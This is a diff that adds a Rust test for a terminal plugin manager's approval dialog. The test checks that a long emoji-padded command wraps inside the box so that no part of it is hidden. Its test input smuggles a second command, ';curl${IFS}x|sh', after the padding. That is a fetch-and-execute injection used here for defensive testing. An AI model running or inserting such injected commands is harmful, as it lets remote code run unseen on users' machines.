@@ -327,6 +327,38 @@ fn a_long_command_in_the_global_approval_box_is_read_to_its_end_before_enter_app
     );
 }
 
+/// B13-1 (rv-code2): a command whose one word holds emoji-presentation pairs is cut where
+/// the box draws it, so no row of what it runs is wider than the room beside its label, and
+/// the rows read back as the whole command, none hidden past the box's edge.
+#[test]
+fn an_emoji_command_in_the_global_approval_box_never_draws_past_its_room() {
+    let word = format!("{};curl${{IFS}}x|sh", "\u{263a}\u{fe0f}".repeat(35));
+    let spec = stdio("/opt/homebrew/bin/uvx", &[word.as_str()]);
+    let mut ctx = plugin_ctx(80, 24);
+    let waiting = server("emoji", spec.clone(), ServerStatus::WaitingForApproval);
+    let mut screen = Plugins::with(Vec::new(), vec![waiting]);
+    screen.key(&Key::Enter, &mut ctx);
+
+    let body = screen
+        .modal(&ctx)
+        .map(|(modal, _)| texts(&modal.body))
+        .unwrap_or_default();
+
+    let room = usize::from(MODAL_WIDTH) - 4 - LABEL_WIDTH;
+    let rows: Vec<String> = body
+        .iter()
+        .skip_while(|line| !line.starts_with("Runs"))
+        .take_while(|line| !line.starts_with("Lines ") && !line.starts_with("Projects"))
+        .map(|line| line.chars().skip(LABEL_WIDTH).collect())
+        .collect();
+    let drawn = crate::tui::screens::new_project_input::cells;
+    assert!(rows.len() > 1, "{body:?}");
+    for row in &rows {
+        assert!(drawn(row) <= room, "{} cells: {row}", drawn(row));
+    }
+    assert_eq!(rows.concat(), crate::memory::visible_text(&spec.runs()));
+}
+
 #[test]
 fn remove_asks_first() {
     let (skills, servers) = lists();
